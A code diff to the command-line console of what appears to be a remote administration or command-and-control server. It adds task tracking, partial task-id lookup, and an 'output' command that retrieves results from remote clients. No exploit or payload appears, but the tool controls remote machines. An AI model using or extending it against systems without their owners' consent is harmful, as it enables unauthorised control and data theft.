@@ -44,6 +44,7 @@ download
 lock [windows only]
 tasks
 stoptask (task id)
+output (task id)
 disconnect
 exit
 """
@@ -54,6 +55,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     prompt = DEFAULT_PROMPT
     client = None
+
+    tasklist = []
 
     def __init__(self, private_key: ec.EllipticCurvePrivateKey):
         BaseServer.__init__(self, private_key)
@@ -121,6 +124,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
             print("No client is selected. To shutdown the server, use 'shutdown'.")
             return
 
+        self.tasklist = []
         self.client = None
         self.prompt = '> '
 
@@ -291,21 +295,54 @@ class ServerCLI(BaseServer, cmd.Cmd):
         """ Fetch all running tasks """
         if self.__check_select(): return
 
-        tasklist = tasks.tasks(self.client)
-        terminal.task_print(tasklist)
+        self.tasklist = tasks.tasks(self.client)
+        terminal.task_print(self.tasklist)
 
     def do_stoptask(self, task_id: str) -> None:
         """ Stop a task on a client """
         if self.__check_select(): return
 
+        task_id = task_id.strip()
+
         if not task_id:
             print("Usage: stoptask (task id)")
             return
 
-        if tasks.stoptask(self.client, task_id.strip()):
-            print("Stopped task.")
-        else:
+        # Find complete task identifier
+        identifier = tasks.find(self.tasklist, task_id)
+        if identifier is None:
             print("Task doesn't exist.")
+            return
+
+        try:
+            tasks.stoptask(self.client, identifier)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print('Stopped task.')
+
+    def do_output(self, task_id: str) -> None:
+        """ Given a task id, get output from finished task from client """
+        if self.__check_select(): return
+
+        task_id = task_id.strip()
+
+        if not task_id:
+            print("Usage: output (task id)")
+            return
+
+        identifier = tasks.find(self.tasklist, task_id)
+        if identifier is None:
+            print("Task doesn't exist.")
+            return
+
+        try:
+            output = tasks.output(self.client, identifier)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print('Output from Task:\n')
+            print(output)
 
     def do_disconnect(self, _) -> None:
         """ Disconnect a client """
@@ -315,7 +352,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
         print("Disconnected client.")
         self.client = None
         self.prompt = DEFAULT_PROMPT
-
+        self.tasklist = []
 
 if __name__ == '__main__':
     from cryptography.hazmat.primitives import serialization
